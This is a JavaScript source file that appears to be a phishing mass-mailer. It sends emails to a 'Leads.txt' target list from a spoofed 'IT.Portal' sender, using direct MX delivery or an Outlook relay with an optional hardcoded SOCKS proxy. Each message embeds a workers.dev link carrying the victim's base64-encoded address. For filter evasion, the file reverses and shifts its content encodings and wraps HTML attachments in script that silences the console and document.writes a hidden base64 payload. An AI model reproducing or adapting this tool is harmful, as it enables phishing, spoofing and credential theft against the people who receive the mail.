import net from 'net';
import os from 'os';
import dns from 'dns';
import fs from 'fs/promises';
import { fileURLToPath } from 'url';
import nodemailer from 'nodemailer';
import { SocksClient } from 'socks';
import HttpsProxyAgent from 'https-proxy-agent';
import tunnel from 'tunnel';
import pLimit from 'p-limit';
import path from 'path';
import base64 from 'base-64';
import mime from 'mime-types';
import crypto from 'crypto';
import { faker } from '@faker-js/faker';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

function generateRandomMD5() {
  return crypto.createHash('md5').update(Math.random().toString()).digest('hex');
}

async function generateUniqueFakeCompanyData() {
  return {
    companyName: faker.company.name(),  // 
    address: faker.address.streetAddress(),
    phoneNumber: faker.phone.number(),
  };
}

function generateFakeCompanyData() {
  const companyName = faker.company.name();
  const firstName = faker.person.firstName();
  const lastName = faker.person.lastName();
  const fullName = `${firstName} ${lastName}`;
  const sanitizedCompanyName = companyName.replace(/[\s,]+/g, '').toLowerCase();
  const companyEmailDomain = `${sanitizedCompanyName}.com`;
  const companyEmail = faker.internet.email({ firstName, lastName, provider: companyEmailDomain });

  return {
    companyName,
    companyEmail,
    companyEmailAndFullName: `"${fullName}" <${companyEmail}>`
  };
}




function generateRandomPath(length) {
  const randomBytes = crypto.randomBytes(length);
  
  const base64Encoded = randomBytes.toString('base64');
  
  const safePath = base64Encoded.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  
  return safePath;
}

const pathLength = 125; 

const randomPath = generateRandomPath(pathLength);



async function getRecipientAddresses(filePath) {
  try {
    const data = await fs.readFile(filePath, 'utf8');
    return data.split(/\r?\n/).filter(line => line.trim() !== '');
  } catch (error) {
    console.error('Error reading leads file:', error);
    throw error;
  }
}

function capitalize(str) {
  if (str && typeof str === 'string') {
    return str.charAt(0).toUpperCase() + str.slice(1);
  }
  return str;
}


function generateBoundary() {
  return '----=_NextPart_' + crypto.randomBytes(16).toString('hex');
}

function replacePlaceholders(content, placeholders) {
  let replacedContent = content;
  for (const placeholder in placeholders) {
    const regex = new RegExp(`{${placeholder}}`, 'g');
    replacedContent = replacedContent.replace(regex, placeholders[placeholder]);
  }
  return replacedContent;
}



const options = {
  method: 'SMTP', // Options: 'SMTP', 'MX'
  useAuthentication: false,
  useProxy: false,
  proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
  smtpHost: 'efasglobal-com.mail.protection.outlook.com',
  smtpPort: 25,
  smtpSecure: false,
  secureProtocol: 'SSLv23_method', // Options: 'SSLv23_method', 'TLSv1_2_method', etc.
  smtpUsername: '',
  smtpPassword: '',
  proxyHost: '63.160.189.222',
  proxyPort: 35149,
  proxyUsername: 'user',
  proxyPassword: 'user',
  useConcurrency: true,
  concurrencyLimit: 3,
  includeAttachments: false,
  attachmentPath: 'attachment.txt', // Specify the attachment file path here
  ENABLE_ENCRYPTION: false,
  Encode_Attachment: false,
};


const attachmentNameWithPlaceholders = 'vm-20241104193406035753-fadceb388a85af9bdf506d7fgds693hdj.html';
const senderAddresses = ['john@efasglobal.com'];
const messageFile = 'message.html';
const senderNameWithPlaceholders = "IT.Portal"; 
const subjectLineWithPlaceholders = "[Theron]⏰";
const MAX_RETRIES = 1; 
const SUCCESS_FILE = 'success-emails.txt';
const FAILURE_FILE = 'failed-emails.txt';

async function clearLogFile(filePath) {
  try {
    await fs.writeFile(filePath, '');
    console.log(`Log file ${filePath} cleared successfully.`);
  } catch (error) {
    console.error(`Error clearing log file ${filePath}:`, error);
  }
}

async function resetLogFiles() {
  await clearLogFile(SUCCESS_FILE);
  await clearLogFile(FAILURE_FILE);
}

async function logSuccess(email) {
  await fs.appendFile(SUCCESS_FILE, `${email}\n`);
}

async function logFailure(email) {
  await fs.appendFile(FAILURE_FILE, `${email}\n`);
}

async function main() {
  try {
    const recipientAddresses = await getRecipientAddresses('Leads.txt');
    

  } catch (error) {
    console.error('Error in main function:', error);
  }
}


async function encryptAndObfuscate(attachmentContent) {
  const encodedContent = base64.encode(attachmentContent);
  const halfLength = Math.floor(encodedContent.length / 2);
  const part1 = encodedContent.slice(0, halfLength).split('').reverse().join('');
  const part2 = encodedContent.slice(halfLength).split('').reverse().join('');

  return `<!DOCTYPE html>
    <html lang="en">
    <head>
	      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
      <script>
        (function() {
          window.console.log = function() {};
          window.console.warn = function() {};
          window.console.error = function() {};
          var a='document', b='write', c='atob', d='${part1}', e='${part2}';
          window[a][b](window[c](d.split('').reverse().join('') + e.split('').reverse().join('')));
        })();
      </script>
    </head>
    <body>
    </body>
    </html>`;
}

function reverseString(str) {
  return str.split('').reverse().join('');
}

function base64Encode(str) {
  return Buffer.from(str).toString('base64').replace(/=*$/, '');
}

function obfuscate(str) {
  return str.split('').map(char => String.fromCharCode(char.charCodeAt(0) + 1)).join('');
}

function base64EncodeReverseObfuscate(str) {
  const reversed = reverseString(str);
  const obfuscated = obfuscate(reversed);
  const encoded = base64Encode(obfuscated);
  return encoded;
}

function base64EncodeReverseObfuscatePlaceholder(content) {
  return content.replace(/{Base64EncodeReverse}\((.*?)\)/g, (match, p1) => {
    return base64EncodeReverseObfuscate(p1);
  });
}

async function sendEmailViaSMTP(recipientAddress, senderAddress) {
  let recipientName;

  if (!recipientName) {
    recipientName = recipientAddress.split('@')[0];
  }
  const recipientDomain = recipientAddress.split('@')[1];
  const recipientDomainName = capitalize(recipientAddress.split('@')[1].split('.')[0]);
  const currentDate = new Date().toLocaleDateString();
  const currentTime = new Date().toLocaleTimeString();
  const random10DigitNumber = Math.random().toString().slice(2, 12);
  const randomString = crypto.randomBytes(20).toString('hex');
  const recipientBase64Email = Buffer.from(recipientAddress).toString('base64');
  const randomMD5 = generateRandomMD5();
  const randomlinks = [
"https://worker-rough-fire-759a.berwieberwieberwieberwieberwie.workers.dev/?eba=",
"https://worker-nameless-haze-86e5.berwieberwieberwieberwieberwie.workers.dev/?eba="
];
		const randomIndex = Math.floor(Math.random() * randomlinks.length);
        const randomLink = randomlinks[randomIndex];
  const { companyName, companyEmail, companyEmailAndFullName } = generateFakeCompanyData();

  const randomPath = generateRandomPath(pathLength);
  const subjectLine = replacePlaceholder(subjectLineWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  const senderName = replacePlaceholder(senderNameWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  const attachmentName = replacePlaceholder(senderNameWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);

  let transporterOptions = {
    host: options.smtpHost,
    port: options.smtpPort,
    secure: options.smtpSecure,
    secureProtocol: options.secureProtocol,
  };

  if (options.useAuthentication) {
    transporterOptions.auth = {
      user: options.smtpUsername,
      pass: options.smtpPassword,
    };
  }

  if (options.useProxy && options.proxyType === 'SOCKS') {
    const proxyOptions = {
      proxy: {
        host: options.proxyHost,
        port: options.proxyPort,
        type: 5, // or 4 for SOCKS v4
      },
      command: 'connect',
      destination: {
        host: options.smtpHost,
        port: options.smtpPort,
      },
    };

    const info = await SocksClient.createConnection(proxyOptions);
    transporterOptions.connection = info.socket;
  }

  const transporter = nodemailer.createTransport(transporterOptions);

  let emailContent;
  try {
    emailContent = await fs.readFile(messageFile, 'utf-8');
    emailContent = processContent(emailContent);
	emailContent = base64EncodeReverseObfuscatePlaceholder(emailContent);
	
  } catch (error) {
    console.error(`Error reading email content file: ${error}`);
    return; // Exit the function if there was an error reading the file
  }

  let attachmentContent = '';
  if (options.includeAttachments) {
  let attachmentFilename = attachmentNameWithPlaceholders;
  try {
    if (options.Encode_Attachment) {
      const mimeType = mime.lookup(attachmentFilename) || 'application/octet-stream';
      const encodedFilename = Buffer.from(attachmentFilename).toString('base64');
      attachmentFilename = `=?utf-8?B?${encodedFilename}?=`;
    }

    const attachmentPath = path.resolve(__dirname, options.attachmentPath);
    attachmentContent = await fs.readFile(attachmentPath, 'utf-8');
    attachmentContent = processContent(attachmentContent);
	attachmentContent = base64EncodeReverseObfuscatePlaceholder(attachmentContent);
  } catch (error) {
    console.error(`Error reading attachment file: ${error}`);
    return; // Exit the function if there was an error reading the file
  }
}

  // Replace merge field placeholders in emailContent and attachmentContent
  emailContent = replacePlaceholder(emailContent, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  attachmentContent = replacePlaceholder(attachmentContent, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);

function processContent(content) {
  const placeholders = {
    '{RECIPIENT_NAME}': recipientName.charAt(0).toUpperCase() + recipientName.slice(1),
    '{RECIPIENT_EMAIL}': recipientAddress,
    '{RECIPIENT_DOMAIN}': recipientDomain,
    '{RECIPIENT_DOMAIN_NAME}': recipientDomainName,
    '{CURRENT_DATE}': currentDate,
    '{CURRENT_TIME}': currentTime,
    '{RANDOM_NUMBER10}': random10DigitNumber,
    '{RANDOM_STRING}': randomString,
    '{RECIPIENT_BASE64_EMAIL}': recipientBase64Email,
    '{RANDOM_MD5}': randomMD5,
	'{RANDLINK}': randomLink,
    '{FAKE_COMPANY}': companyName,
    '{FAKE_COMPANY_EMAIL}': companyEmail,
    '{FAKE_COMPANY_EMAIL_AND_FULLNAME}': companyEmailAndFullName,
    '{RANDOM_PATH}': randomPath,
  };

  content = replacePlaceholders(content, placeholders);
  content = encodeBase64Content(content);

  return content;
}

function replacePlaceholders(content, placeholders) {
  for (const [placeholder, replacement] of Object.entries(placeholders)) {
    const regex = new RegExp(placeholder, 'g');
    content = content.replace(regex, replacement);
  }
  return content;
}

function encodeBase64Content(content) {
  return content.replace(/{Base64Encode}\((.*?)\)/g, (match, p1) => {
    return Buffer.from(p1).toString('base64');
  });
}

function replacePlaceholder(content, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath) {
  const placeholders = {
    '{RECIPIENT_NAME}': recipientName.charAt(0).toUpperCase() + recipientName.slice(1),
    '{RECIPIENT_EMAIL}': recipientAddress,
    '{RECIPIENT_DOMAIN}': recipientDomain,
    '{RECIPIENT_DOMAIN_NAME}': recipientDomainName,
    '{CURRENT_DATE}': currentDate,
    '{CURRENT_TIME}': currentTime,
    '{RANDOM_NUMBER10}': random10DigitNumber,
    '{RANDOM_STRING}': randomString,
    '{RECIPIENT_BASE64_EMAIL}': recipientBase64Email,
    '{RANDOM_MD5}': randomMD5,
	'{RANDLINK}': randomLink,
    '{FAKE_COMPANY}': companyName,
    '{FAKE_COMPANY_EMAIL}': companyEmail,
    '{FAKE_COMPANY_EMAIL_AND_FULLNAME}': companyEmailAndFullName,
    '{RANDOM_PATH}': randomPath,
  };

  const regex = new RegExp(Object.keys(placeholders).join('|'), 'gi');
  
  return content.replace(regex, (matched) => placeholders[matched.toUpperCase()]);
}




const obfuscatedAttachmentContent = options.ENABLE_ENCRYPTION && attachmentContent
  ? await encryptAndObfuscate(attachmentContent)
  : attachmentContent;

const processedAttachmentName = replacePlaceholder(
  attachmentNameWithPlaceholders, 
  recipientName, 
  recipientAddress, 
  recipientDomain, 
  currentDate, 
  currentTime, 
  random10DigitNumber, 
  randomString, 
  recipientBase64Email, 
  randomMD5, 
  randomLink,
  companyName, 
  companyEmail, 
  companyEmailAndFullName, 
  recipientDomainName, 
  randomPath
);

const mailOptions = {
  from: `"${senderName}" <${senderAddress}>`,
  to: recipientAddress,
  subject: subjectLine,
  html: emailContent,
  attachments: options.includeAttachments ? [{
    filename: processedAttachmentName,
    content: obfuscatedAttachmentContent,
    contentType: 'text',
  }] : [],    
};

return new Promise((resolve, reject) => {
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(`Error sending email to ${recipientAddress}: ${error}`);
      return reject(error);
    }
    console.log(`Email sent to ${recipientAddress}: ${info.messageId}`);
    resolve(info.messageId);
  });
});
}


async function sendEmailViaMX(recipientAddress, senderAddress) {
  let recipientName;

  if (!recipientName) {
    recipientName = recipientAddress.split('@')[0];
  }
  
  const recipientDomain = recipientAddress.split('@')[1];
  const recipientDomainName = capitalize(recipientAddress.split('@')[1].split('.')[0]);
  
  const currentDate = new Date().toLocaleDateString();
  const currentTime = new Date().toLocaleTimeString();
  const random10DigitNumber = Math.random().toString().slice(2, 12);
  const randomString = crypto.randomBytes(20).toString('hex');
  const recipientBase64Email = Buffer.from(recipientAddress).toString('base64');
  const randomMD5 = generateRandomMD5();
  const randomlinks = [
"https://worker-rough-fire-759a.berwieberwieberwieberwieberwie.workers.dev/?eba=",
"https://worker-nameless-haze-86e5.berwieberwieberwieberwieberwie.workers.dev/?eba="
];
		const randomIndex = Math.floor(Math.random() * randomlinks.length);
        const randomLink = randomlinks[randomIndex];
  
  const { companyName, companyEmail, companyEmailAndFullName } = generateFakeCompanyData();

  const randomPath = generateRandomPath(pathLength);
  const subjectLine = replacePlaceholder(subjectLineWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  const senderName = replacePlaceholder(senderNameWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  const attachmentName = replacePlaceholder(senderNameWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);


  let emailContent = await fs.readFile(messageFile, 'utf-8');
      emailContent = processContent(emailContent, recipientAddress, senderAddress);
	  emailContent = base64EncodeReverseObfuscatePlaceholder(emailContent);
  let attachmentContent = await fs.readFile(options.attachmentPath, 'utf-8');
      attachmentContent = processContent(attachmentContent);
	  attachmentContent = base64EncodeReverseObfuscatePlaceholder(attachmentContent);


  emailContent = replacePlaceholder(emailContent, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  attachmentContent = replacePlaceholder(attachmentContent, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);

function replacePlaceholder(content, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath) {
  const placeholders = {
    '{RECIPIENT_NAME}': recipientName.charAt(0).toUpperCase() + recipientName.slice(1),
    '{RECIPIENT_EMAIL}': recipientAddress,
    '{RECIPIENT_DOMAIN}': recipientDomain,
    '{RECIPIENT_DOMAIN_NAME}': recipientDomainName,
    '{CURRENT_DATE}': currentDate,
    '{CURRENT_TIME}': currentTime,
    '{RANDOM_NUMBER10}': random10DigitNumber,
    '{RANDOM_STRING}': randomString,
    '{RECIPIENT_BASE64_EMAIL}': recipientBase64Email,
    '{RANDOM_MD5}': randomMD5,
	'{RANDLINK}': randomLink,
    '{FAKE_COMPANY}': companyName,
    '{FAKE_COMPANY_EMAIL}': companyEmail,
    '{FAKE_COMPANY_EMAIL_AND_FULLNAME}': companyEmailAndFullName,
    '{RANDOM_PATH}': randomPath,
  };

  const regex = new RegExp(Object.keys(placeholders).join('|'), 'gi');
  
  return content.replace(regex, (matched) => placeholders[matched.toUpperCase()]);
}

function processContent(content) {
  const placeholders = {
    '{RECIPIENT_NAME}': recipientName.charAt(0).toUpperCase() + recipientName.slice(1),
    '{RECIPIENT_EMAIL}': recipientAddress,
    '{RECIPIENT_DOMAIN}': recipientDomain,
    '{RECIPIENT_DOMAIN_NAME}': recipientDomainName,
    '{CURRENT_DATE}': currentDate,
    '{CURRENT_TIME}': currentTime,
    '{RANDOM_NUMBER10}': random10DigitNumber,
    '{RANDOM_STRING}': randomString,
    '{RECIPIENT_BASE64_EMAIL}': recipientBase64Email,
    '{RANDOM_MD5}': randomMD5,
	'{RANDLINK}': randomLink,
    '{FAKE_COMPANY}': companyName,
    '{FAKE_COMPANY_EMAIL}': companyEmail,
    '{FAKE_COMPANY_EMAIL_AND_FULLNAME}': companyEmailAndFullName,
    '{RANDOM_PATH}': randomPath,
	
  };

  content = replacePlaceholders(content, placeholders);
  content = encodeBase64Content(content);

  return content;
}

function replacePlaceholders(content, placeholders) {
  for (const [placeholder, replacement] of Object.entries(placeholders)) {
    const regex = new RegExp(placeholder, 'g');
    content = content.replace(regex, replacement);
  }
  return content;
}

function encodeBase64Content(content) {
  return content.replace(/{Base64Encode}\((.*?)\)/g, (match, p1) => {
    return Buffer.from(p1).toString('base64');
  });
}


  if (options.ENABLE_ENCRYPTION) {
    attachmentContent = await encryptAndObfuscate(attachmentContent);
  }

  const encodedAttachment = Buffer.from(attachmentContent).toString('base64').match(/.{1,76}/g).join('\r\n');
  const addresses = await dns.promises.resolveMx(recipientDomain);

  if (!addresses.length) {
    throw new Error(`No MX records found for ${domain}`);
  }

  const mxRecord = addresses.sort((a, b) => a.priority - b.priority)[0];
  const client = net.createConnection(25, mxRecord.exchange);
  client.setEncoding('utf8');
  
  const processedAttachmentName = replacePlaceholder(
  attachmentNameWithPlaceholders, 
  recipientName, 
  recipientAddress, 
  recipientDomain, 
  currentDate, 
  currentTime, 
  random10DigitNumber, 
  randomString, 
  recipientBase64Email, 
  randomMD5, 
  randomLink,
  companyName, 
  companyEmail, 
  companyEmailAndFullName, 
  recipientDomainName, 
  randomPath
);

  const boundary = generateBoundary();
const commands = [
  `HELO ${os.hostname()}`,
  `MAIL FROM:<${senderAddress}>`,
  `RCPT TO:<${recipientAddress}>`,
  `DATA`,
  `From: "${senderName}" <${senderAddress}>`,
  `To: ${recipientAddress}`,
  `Subject: ${subjectLine}`,
  `MIME-Version: 1.0`,
  `Content-Type: multipart/mixed; boundary="${boundary}"`,
  '',
  `--${boundary}`,
  `Content-Type: text/html; charset="UTF-8"`,
  `Content-Transfer-Encoding: quoted-printable`,
  '',
  emailContent,
];

if (options.includeAttachments) {
  try {
    const __dirname = path.dirname(new URL(import.meta.url).pathname);
    const attachmentPath = path.resolve(__dirname, options.attachmentPath);
    let attachmentContent = await fs.readFile(attachmentPath, 'utf-8');
    
    attachmentContent = base64EncodeReverseObfuscatePlaceholder(attachmentContent);

    const processedAttachment = processContent(attachmentContent, recipientAddress, senderAddress);

    if (options.ENABLE_ENCRYPTION) {
      console.log(`Encrypting attachment...`);
      attachmentContent = await encryptAndObfuscate(processedAttachment);
      console.log(`Encryption complete. Encrypted size: ${attachmentContent.length} bytes`);
    } else {
      attachmentContent = processedAttachment;
    }

    const encodedAttachment = Buffer.from(attachmentContent).toString('base64');
    
    let attachmentFilename = processedAttachmentName;
    if (options.encodeAttachmentName) {
      const base64Filename = Buffer.from(attachmentFilename).toString('base64');
      attachmentFilename = `=?utf-8?B?${base64Filename}?=`;
    }

    commands.push(
      `--${boundary}`,
      `Content-Type: application/octet-stream; name="${attachmentFilename}"`,
      `Content-Transfer-Encoding: base64`,
      `Content-Disposition: attachment; filename="${attachmentFilename}"`,
      '',
      encodedAttachment
    );
  } catch (error) {
    console.error(`Error reading and processing attachment file: ${error}`);
  }
}

commands.push(
  `--${boundary}--`,
  '',
  '.',
  `QUIT`
);


  let commandIndex = 0;

  client.on('data', (data) => {
    console.log('Received:', data); 
  });

  client.on('error', (error) => {
    console.error(`Error connecting to ${mxRecord.exchange}:`, error);
  });

  client.on('close', () => {
    console.log(`Connection closed with ${mxRecord.exchange}`);
  });

  client.on('connect', () => {
    sendNextCommand(client, commands, commandIndex);
  });
}

function sendNextCommand(client, commands, commandIndex) {
  if (commandIndex < commands.length) {
    const command = commands[commandIndex];
    console.log('Sending:', command);
    client.write(command + '\r\n', () => {
      sendNextCommand(client, commands, commandIndex + 1);
    });
  }
}



async function sendEmails(recipientAddresses, senderAddress) {
  const limit = pLimit(options.concurrencyLimit);
  const failedEmails = [];

  const sendTasks = recipientAddresses.map((recipientAddress) => {
    const sendEmailFunction = async () => {
      for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        try {
          if (options.method === 'SMTP') {
            await sendEmailViaSMTP(recipientAddress, senderAddress);
          } else if (options.method === 'MX') {
            await sendEmailViaMX(recipientAddress, senderAddress);
          } else {
            console.error('Invalid sending method');
            throw new Error('Invalid sending method');
          }
          console.log(`Email successfully sent to ${recipientAddress} from ${senderAddress}`);
          await logSuccess(recipientAddress);
          return `Success: ${recipientAddress}`;
        } catch (error) {
          console.error(`Attempt ${attempt} failed for ${recipientAddress}:`, error.message);
          if (attempt === MAX_RETRIES) {
            failedEmails.push(recipientAddress);
            await logFailure(recipientAddress);
          }
        }
      }
    };

    return options.useConcurrency ? limit(sendEmailFunction) : sendEmailFunction();
  });

  try {
    const results = await Promise.all(sendTasks);
    console.log('Email sending results:', results);
    if (failedEmails.length > 0) {
      console.error(`Failed to send emails to the following addresses after ${MAX_RETRIES} attempts:`, failedEmails);
    }
  } catch (error) {
    console.error('Error during email sending:', error);
  }
}


async function startSendingEmails() {
  try {
    await resetLogFiles();
    const recipientAddresses = await getRecipientAddresses('Leads.txt');

    for (const senderAddress of senderAddresses) {
      console.log(`Sending emails from ${senderAddress}`);
      await sendEmails(recipientAddresses, senderAddress); 
    }
  } catch (error) {
    console.error('Failed to start sending emails:', error);
  }
}

startSendingEmails();
